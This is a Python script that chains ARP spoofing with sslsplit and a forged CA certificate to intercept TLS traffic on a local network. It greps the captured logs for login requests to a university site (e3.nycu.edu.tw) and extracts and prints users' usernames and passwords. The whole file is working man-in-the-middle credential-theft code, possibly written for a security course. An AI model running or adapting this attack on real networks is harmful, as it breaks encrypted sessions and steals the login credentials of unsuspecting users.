#!/usr/bin/env python3
import os
import signal
import socket
import time
import struct
from fcntl import ioctl
import scapy.all as scapy
from subprocess import Popen, DEVNULL

log_dir = "./sslsplit_log"
connect_log = 'connect.log'
capture_info = '/login/index.php HTTP/1.1'

def process_packets():
    Popen(["sslsplit", "-D", '-l', 'connect.log', '-p', 'sslsplit.pid', "-S","sslsplit_log", 
           "-k", "ca.key", "-c", "ca.crt",            
           "ssl", "0.0.0.0", "8443"],
           stdout=DEVNULL, stderr=DEVNULL)
    return

def find_log_file():
    # get the latest connect
    find_log = os.popen(f"grep -s '{capture_info}' {log_dir}/* | tail -n 1").read().split() # -s: not print error
    if(len(find_log) > 0):
        for log_path in find_log:
            if(log_path.find('.log')!=-1):
                #print(log_path)
                return log_path
    return 0

#usr, pw, tok = 'username=', '&password=', '&token'
def print_usr_passwd(log_path):
    find_usr = os.popen(f'grep -s username {log_path}').read().strip()
    if(not find_usr): 
        print('entering...\n')
        return
    with open(log_path, 'rb') as b:
        log = b.read()
        usr_off = log.rfind('username='.encode())
        pass_off = log.rfind('&password='.encode())
        tok_off = log.rfind('&token'.encode())
        
        username = log[usr_off+len('username='):pass_off].decode()
        password = log[pass_off+len('&password='):tok_off].decode()
        print(f'username: {username}\npassowrd: {password}\n')

def count_connect():
    return os.popen(f'cat {connect_log} 2>/dev/null | grep -s sni:e3.nycu.edu.tw | wc -l').read().strip()

def arp_spoofing():
    Popen(['./arp_spoofing'])

before_connect = count_connect()
print(f'\nconnect num before start: {before_connect}')

arp_spoofing()
time.sleep(5)

process_packets()

while True:
    time.sleep(3)
    after_connect = count_connect()
    if(before_connect == after_connect): continue

    log_file = find_log_file() 
    if(log_file):
        print_usr_passwd(log_file)


#    with open("sslsplit.pid") as pid_file:
#        pid = next(pid_file).strip()
#        os.kill(int(pid), signal.SIGTERM)

# sniff(filter="arp", prn=ARP_spoofing, store=0)
